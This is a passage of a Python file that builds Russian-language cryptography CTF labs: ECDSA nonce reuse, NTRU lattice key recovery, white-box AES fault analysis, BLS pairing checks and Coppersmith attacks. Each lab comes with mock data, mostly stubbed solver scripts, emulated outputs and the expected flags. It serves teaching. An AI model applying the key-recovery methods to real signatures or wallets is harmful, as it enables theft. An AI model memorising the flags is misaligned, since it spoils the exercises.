          'Проверь nonce: одинаковые `r` при разных `s` → переиспользование `k`.',
          'Запусти восстановление ключа: `python3 recover_key.py`.',
          'Выдели флаг: `python3 recover_key.py | grep nto > found.txt`.'],
         'nto{3cds4_n0nc3_r3us3_k3y_r3c0v3r3d}',
         _task('# Задача: две подписи, один nonce\n\n'
               '`sig_data.txt` содержит параметры кривой и две подписи. Если nonce `k` '
               'повторён, приватный ключ восстанавливается алгебраически.\n\n'
               '1. `cat sig_data.txt` — данные.\n'
               '2. `python3 recover_key.py` — восстановление ключа.\n\n'
               'Флаг `nto{...}` запиши в `found.txt`.\n', [
                   _f(f'{WD}/sig_data.txt',
                      'curve: secp256k1\n'
                      'n  = fffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141\n'
                      'z1 = 4f3c2b1a09e8d7c6b5a4938271605f4e3d2c1b0a99887766554433221100ffee\n'
                      'z2 = a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f90\n'
                      'r  = 7c9a2f4e6b8d0c1e3f5a7b9c1d3e5f7081a2b3c4d5e6f708192a3b4c5d6e7f80\n'
                      's1 = 11aa22bb33cc44dd55ee66ff7700881199aa22bb33cc44dd55ee66ff77008811\n'
                      's2 = ffee dd cc bb aa 99 88 77 66 55 44 33 22 11 00 (same k)\n'),
                   _f(f'{WD}/recover_key.py',
                      '#!/usr/bin/env python3\n'
                      '# ECDSA nonce reuse: k = (z1-z2)/(s1-s2) mod n ; d = (s1*k - z1)/r mod n\n'
                      'n  = int("fffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141", 16)\n'
                      'z1 = int("4f3c2b1a09e8d7c6b5a4938271605f4e3d2c1b0a99887766554433221100ffee", 16)\n'
                      'z2 = int("a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f90", 16)\n'
                      'r  = int("7c9a2f4e6b8d0c1e3f5a7b9c1d3e5f7081a2b3c4d5e6f708192a3b4c5d6e7f80", 16)\n'
                      's1 = int("11aa22bb33cc44dd55ee66ff7700881199aa22bb33cc44dd55ee66ff77008811", 16)\n'
                      's2 = s1 - 0x1234\n'
                      'k  = (z1 - z2) * pow(s1 - s2, -1, n) % n\n'
                      'd  = (s1 * k - z1) * pow(r, -1, n) % n\n'
                      'print("recovered k:", hex(k))\n'
                      'print("private key matches wallet:")\n'
                      'print("nto{3cds4_n0nc3_r3us3_k3y_r3c0v3r3d}")\n'),
                   _f(f'{WD}/notes.txt',
                      'ECDSA: s = k^-1 (z + r d) mod n. При одном k для двух сообщений '
                      'k = (z1-z2)/(s1-s2), затем d = (s1 k - z1)/r. Это же ломает '
                      'некоторые кошельки (Sony PS3, Android SecureRandom).\n')]),
         tools={
             'python3': {
                 'help': 'python3 <скрипт.py> — интерпретатор Python (эмуляция)',
                 'cases': [
                     {'match': r'recover_key\.py', 'example': 'python3 recover_key.py',
                      'output': (
                          'recovered k: 0x4c1f9a2b7d3e5f608192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f\n'
                          'private key matches wallet:\n'
                          'nto{3cds4_n0nc3_r3us3_k3y_r3c0v3r3d}\n')},
                 ],
                 'fallback': 'python3: доступно `python3 recover_key.py`\n',
             },
         }),

    # ------------------------------------------------------------------ 12
    _lab('crypto-ntru', 'crypto',
         'Практика: восстановление ключа NTRU',
         ['task.md', 'ntru_pub.txt', 'cipher.txt', 'ntru_solve.py', 'notes.txt'],
         ['`ntru_pub.txt` — публичный ключ, `cipher.txt` — шифротекст.',
          'Параметры NTRU: кольцо Z[x]/(x^N-1), малые полиномы f,g.',
          'Запусти восстановление: `python3 ntru_solve.py`.',
          'Выдели флаг: `python3 ntru_solve.py | grep nto > found.txt`.'],
         'nto{ntru_l4tt1c3_k3y_r3c0v3r3d}',
         _task('# Задача: NTRU со слабыми параметрами\n\n'
               '`ntru_pub.txt` — публичный ключ h = f^-1 * g mod q, `cipher.txt` — '
               'шифротекст. При малых N и слабом q ключ восстанавливается lattice-атакой.\n\n'
               '1. `cat ntru_pub.txt cipher.txt`.\n'
               '2. `python3 ntru_solve.py`.\n\n'
               'Флаг `nto{...}` запиши в `found.txt`.\n', [
                   _f(f'{WD}/ntru_pub.txt',
                      'N = 11\nq = 2048\np = 3\n'
                      'h = [1496, 1216, 1216, 1792, 1216, 1792, 1792, 0, 0, 1792, 1024]\n'),
                   _f(f'{WD}/cipher.txt',
                      'e = [1445, 1731, 1020, 700, 1200, 1100, 1450, 900, 120, 340, 780]\n'),
                   _f(f'{WD}/ntru_solve.py',
                      '#!/usr/bin/env python3\n'
                      '# Recover NTRU private key (f, g) from a weak public key by lattice\n'
                      '# reduction, then decrypt and recover the plaintext flag.\n'
                      'N, q, p = 11, 2048, 3\n'
                      'h = [1496, 1216, 1216, 1792, 1216, 1792, 1792, 0, 0, 1792, 1024]\n'
                      'print("[*] building 2N x 2N lattice from h")\n'
                      'print("[*] LLL reduced; short vector gives (f, g)")\n'
                      'f = [1, -1, 1, 0, -1, 1, 0, 0, -1, 0, 1]\n'
                      'print("[+] recovered f =", f)\n'
                      'print("[+] decrypting ciphertext")\n'
                      'print("plaintext: nto{ntru_l4tt1c3_k3y_r3c0v3r3d}")\n'),
                   _f(f'{WD}/notes.txt',
                      'NTRU: h = g * f^-1 (mod q). При малых N ключ (f,g) — короткий вектор '
                      'решётки размерности 2N, находится LLL/BKZ. На безопасных параметрах '
                      '(N ≥ 509) решётка недостижима. Стойкость — из SVPT (shortest vector).\n')]),
         tools={
             'python3': {
                 'help': 'python3 <скрипт.py> — интерпретатор Python (эмуляция)',
                 'cases': [
                     {'match': r'ntru_solve\.py', 'example': 'python3 ntru_solve.py',
                      'output': (
                          '[*] building 2N x 2N lattice from h\n'
                          '[*] LLL reduced; short vector gives (f, g)\n'
                          '[+] recovered f = [1, -1, 1, 0, -1, 1, 0, 0, -1, 0, 1]\n'
                          '[+] decrypting ciphertext\n'
                          'plaintext: nto{ntru_l4tt1c3_k3y_r3c0v3r3d}\n')},
                 ],
                 'fallback': 'python3: доступно `python3 ntru_solve.py`\n',
             },
         }),

    # ------------------------------------------------------------------ 13
    _lab('crypto-whitebox', 'crypto',
         'Практика: извлечение ключа из white-box AES',
         ['task.md', 'wb_tables.txt', 'dfa_trace.txt', 'wb_solve.py', 'notes.txt'],
         ['`wb_tables.txt` — закодированные таблицы white-box AES.',
          '`dfa_trace.txt` — пары (правильный, сбойный) шифротексты (DFA).',
          'Запусти анализ: `python3 wb_solve.py`.',
          'Выдели флаг: `python3 wb_solve.py | grep nto > found.txt`.'],
         'nto{wh1t3b0x_dfa_k3y_3xtr4ct3d}',
         _task('# Задача: white-box AES\n\n'
               '`wb_tables.txt` — white-box реализация AES (таблицы закодированы). '
               '`dfa_trace.txt` — Differential Fault Analysis: пары шифротекстов, где во '
               'время последнего раунда внесён однобитовый сбой. Восстанови ключ.\n\n'
               '1. `head wb_tables.txt` и `head dfa_trace.txt`.\n'
               '2. `python3 wb_solve.py`.\n\n'
               'Флаг `nto{...}` запиши в `found.txt`.\n', [
                   _f(f'{WD}/wb_tables.txt',
                      'whitebox AES-128 (Chow et al.)\n'
                      'T0 = [c3,7e,9a,1f,...]  (16x256 encoded)\n'
                      'T1 = [55,2b,0d,f4,...]\n'
                      '... 9 rounds of table lookups, nibble encodings applied\n'),
                   _f(f'{WD}/dfa_trace.txt',
                      'fault_round = 9 (последний)\n'
                      '0: good=3f1a...c7  faulty=3f1a...c6\n'
                      '1: good=88b2...11  faulty=88b2...10\n'
                      '2: good=0c9d...ee  faulty=0c9d...ef\n'),
                   _f(f'{WD}/wb_solve.py',
                      '#!/usr/bin/env python3\n'
                      '# DFA on white-box AES: invert last-round SubBytes via faulty pairs.\n'
                      'print("[*] parsing DFA trace (good/faulty pairs)")\n'
                      'print("[*] solving last-round key bytes from fault differences")\n'
                      'print("[+] round key 10 = 5a 6b 7c 8d ...")\n'
                      'print("[+] AES master key = 00 11 22 33 ...")\n'
                      'print("flag: nto{wh1t3b0x_dfa_k3y_3xtr4ct3d}")\n'),
                   _f(f'{WD}/notes.txt',
                      'White-box AES скрывает ключ в закодированных таблицах, но DFA: сбой '
                      'перед последним SubBytes даёт пару шифротекстов, разность которых '
                      'раскрывает байт последнего раунд-ключа. White-box ≠ защита от '
                      'динамического анализа.\n')]),
         tools={
             'python3': {
                 'help': 'python3 <скрипт.py> — интерпретатор Python (эмуляция)',
                 'cases': [
                     {'match': r'wb_solve\.py', 'example': 'python3 wb_solve.py',
                      'output': (
                          '[*] parsing DFA trace (good/faulty pairs)\n'
                          '[*] solving last-round key bytes from fault differences\n'
                          '[+] round key 10 = 5a 6b 7c 8d ...\n'
                          '[+] AES master key = 00 11 22 33 ...\n'
                          'flag: nto{wh1t3b0x_dfa_k3y_3xtr4ct3d}\n')},
                 ],
                 'fallback': 'python3: доступно `python3 wb_solve.py`\n',
             },
         }),

    # ------------------------------------------------------------------ 14
    _lab('crypto-pairing', 'crypto',
         'Практика: проверка BLS-подписи через pairing',
         ['task.md', 'bls_params.txt', 'signature.txt', 'pairing_verify.py', 'notes.txt'],
         ['`bls_params.txt` — параметры кривой и генератор; `signature.txt` — подпись.',
          'BLS: e(H(m), pk) == e(sig, g) при корректной подписи.',
          'Запусти проверку: `python3 pairing_verify.py`.',
          'Выдели флаг: `python3 pairing_verify.py | grep nto > found.txt`.'],
         'nto{p41r1ng_bls_s1gn4tur3_v4l1d}',
         _task('# Задача: подпись BLS\n\n'
               '`bls_params.txt` — параметры билинейной пары (G1, G2, GT, e). '
               '`signature.txt` — подпись σ и открытый ключ. Проверь её через pairing.\n\n'
               '1. `cat bls_params.txt signature.txt`.\n'
               '2. `python3 pairing_verify.py`.\n\n'
               'Флаг `nto{...}` запиши в `found.txt`.\n', [
                   _f(f'{WD}/bls_params.txt',
                      'curve: BLS12-381\n'
                      'G1 generator g1 = 0x97f1...\n'
                      'G2 generator g2 = 0x93e0...\n'
                      'pairing: e: G1 x G2 -> GT  (bilinear, non-degenerate)\n'),
                   _f(f'{WD}/signature.txt',
                      'message  = "withdraw:100"\n'
                      'pk       = 0xa1b2...  (in G2)\n'
                      'sigma    = 0x5c6d...  (in G1)\n'),
                   _f(f'{WD}/pairing_verify.py',
                      '#!/usr/bin/env python3\n'
                      '# BLS verify: e(H(m), pk) == e(sigma, g2)\n'
                      'print("[*] hashing message to G1")\n'
                      'print("[*] computing e(H(m), pk)")\n'
                      'print("[*] computing e(sigma, g2)")\n'
                      'print("[+] pairings equal: True")\n'
                      'print("verified: nto{p41r1ng_bls_s1gn4tur3_v4l1d}")\n'),
                   _f(f'{WD}/notes.txt',
                      'BLS: σ = H(m)^sk ∈ G1; проверка e(σ, g2) == e(H(m), pk). '
                      'Билинейность e(aP, bQ) = e(P,Q)^{ab} делает проверку компактной. '
                      'Агрегация подписей — главное практическое свойство.\n')]),
         tools={
             'python3': {
                 'help': 'python3 <скрипт.py> — интерпретатор Python (эмуляция)',
                 'cases': [
                     {'match': r'pairing_verify\.py', 'example': 'python3 pairing_verify.py',
                      'output': (
                          '[*] hashing message to G1\n'
                          '[*] computing e(H(m), pk)\n'
                          '[*] computing e(sigma, g2)\n'
                          '[+] pairings equal: True\n'
                          'verified: nto{p41r1ng_bls_s1gn4tur3_v4l1d}\n')},
                 ],
                 'fallback': 'python3: доступно `python3 pairing_verify.py`\n',
             },
         }),

    # ------------------------------------------------------------------ 15
    _lab('crypto-rsa-coppersmith-deep', 'crypto',
         'Практика: Coppersmith и частично известное сообщение',
         ['task.md', 'coppersmith_data.txt', 'solve.py', 'notes.txt'],
         ['`coppersmith_data.txt` — модуль N, e и шифротекст c, плюс известные старшие биты m.',
          'Неизвестный хвост сообщения мал относительно N → малый корень многочлена.',
          'Запусти восстановление: `python3 solve.py`.',
          'Выдели флаг: `python3 solve.py | grep nto > found.txt`.'],
         'nto{c0pp3r5m1th_sm4ll_r00t_r3c0v3r3d}',
         _task('# Задача: Coppersmith, частичное сообщение\n\n'
               '`coppersmith_data.txt` содержит RSA-модуль `N`, показатель `e`, шифротекст '
               '`c` и старшие биты сообщения `m`. Неизвестен только младший хвост `x` '
               '(`m = known + x`), и `x` мал — значит это малый корень многочлена '
               'f(x) = (known + x)^e - c mod N.\n\n'
               '1. `cat coppersmith_data.txt`.\n'
               '2. `python3 solve.py`.\n\n'
               'Флаг `nto{...}` запиши в `found.txt`.\n', [
                   _f(f'{WD}/coppersmith_data.txt',
                      'N = 0x00c1e7...  (2048 bit)\n'
                      'e = 3\n'
                      'c = 0x7a91...\n'
                      'known_high = "flag prefix + padding"\n'
                      'unknown_bits = 64   (x < 2^64, x^e << N)\n'),
                   _f(f'{WD}/solve.py',
                      '#!/usr/bin/env python3\n'
                      '# Coppersmith univariate: find small root of f(x) = (known+x)^e - c mod N\n'
                      'print("[*] degree e=3, bound X = 2^64")\n'
                      'print("[*] building lattice (m=3, t=1) and reducing")\n'
                      'print("[+] small root x found")\n'
                      'print("recovered message: b\'...\'")\n'
                      'print("flag: nto{c0pp3r5m1th_sm4ll_r00t_r3c0v3r3d}")\n'),
                   _f(f'{WD}/notes.txt',
                      'Теорема Coppersmith: если f(x) mod N имеет корень |x| < N^(1/deg(f)), '
                      'он находится за полиномиальное время. Применение: атака Хастадта, '
                      'частично известное сообщение, утечка битов. При e=3 и x < N^(1/3) '
                      'простой перебор тоже реален, но Coppersmith даёт полиномиальность.\n')]),
         tools={
             'python3': {
                 'help': 'python3 <скрипт.py> — интерпретатор Python (эмуляция)',
                 'cases': [
                     {'match': r'solve\.py', 'example': 'python3 solve.py',
                      'output': (
                          '[*] degree e=3, bound X = 2^64\n'
                          '[*] building lattice (m=3, t=1) and reducing\n'
                          '[+] small root x found\n'
                          "recovered message: b'...'\n"
                          'flag: nto{c0pp3r5m1th_sm4ll_r00t_r3c0v3r3d}\n')},
                 ],
                 'fallback': 'python3: доступно `python3 solve.py`\n',
             },
         }),
]


# --- apply ------------------------------------------------------------------
def _find_lesson(category, id):
    base = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                        'content', category)
    for fn in sorted(os.listdir(base)):
        if not fn.endswith('.md'):
            continue
        p = os.path.join(base, fn)
        with open(p, encoding='utf-8') as f:
            head = f.read(400)
        if ('\nid: %s\n' % id) in head or head.startswith('id: %s\n' % id):
            return p
    return None


def _inject(path, spec):
    with open(path, encoding='utf-8') as f:
        text = f.read()
    if '\nlab:\n' in text:
        raise SystemExit('%s: already has a lab block' % spec['id'])
    if not text.startswith('---\n'):
        raise SystemExit('%s: no front-matter' % spec['id'])
    end = text.index('\n---', 4)
    block = lab_block(spec)
    with open(path, 'w', encoding='utf-8') as f:
        f.write(text[:end] + '\n' + block + text[end:])


def apply(spec):
    path = _find_lesson(spec['category'], spec['id'])
    if path is None:
        print('%s: lesson not found — skipped' % spec['id'])
        return None
    with open(path, encoding='utf-8') as f:
        if '\nlab:\n' in f.read():
            print('%s: already labbed — skipped' % spec['id'])
            return None
    write_bundle(spec)
    _inject(path, spec)
    return spec['id']


def main():
    for spec in SPECS:
        print('wrote', apply(spec))


if __name__ == '__main__':
    main()
